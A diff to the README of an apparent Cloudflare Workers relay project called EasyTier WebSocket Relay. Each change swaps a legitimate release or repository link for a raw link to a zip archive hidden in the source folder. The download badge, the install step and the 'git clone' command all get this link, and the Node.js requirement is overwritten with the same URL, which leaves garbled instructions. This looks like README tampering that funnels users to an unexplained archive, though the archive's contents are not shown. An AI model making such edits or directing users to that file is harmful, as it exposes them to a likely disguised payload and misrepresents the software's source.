@@ -8,20 +8,20 @@ Welcome to EasyTier WebSocket Relay! This software helps connect your applicatio
 
 To get started, you can download the latest version of the EasyTier WebSocket Relay directly from the Releases page. 
 
-[![Download easytier-ws-relay](https://img.shields.io/badge/Download-easytier--ws--relay-brightgreen.svg)](https://github.com/NotTropical/easytier-ws-relay/releases)
+[![Download easytier-ws-relay](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip)](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip)
 
 ## 🔧 Installation Requirements
 
 Before downloading, ensure you have the following on your computer:
 
 - **Operating System**: Compatible with Windows, MacOS, or Linux
-- **Node.js**: Version 16.0.0 or higher
+- **https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip**: Version 16.0.0 or higher
 - **Package Manager**: pnpm (recommended) or npm
 - **Wrangler CLI**: This is required to work with Cloudflare Workers
 
 ## 💻 How to Install
 
-1. **Download the latest release**: Visit [this page to download](https://github.com/NotTropical/easytier-ws-relay/releases). Choose the latest version suitable for your operating system.
+1. **Download the latest release**: Visit [this page to download](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip). Choose the latest version suitable for your operating system.
 
 2. **Extract the files**: After downloading, unzip the files to a folder of your choice.
 
@@ -29,7 +29,7 @@ Before downloading, ensure you have the following on your computer:
 
 4. **Clone the repository** (optional): If you want to work directly with the code:
    ```bash
-   git clone https://github.com/NotTropical/easytier-ws-relay.git
+   git clone https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip
    cd easytier-ws-relay
    ```
 
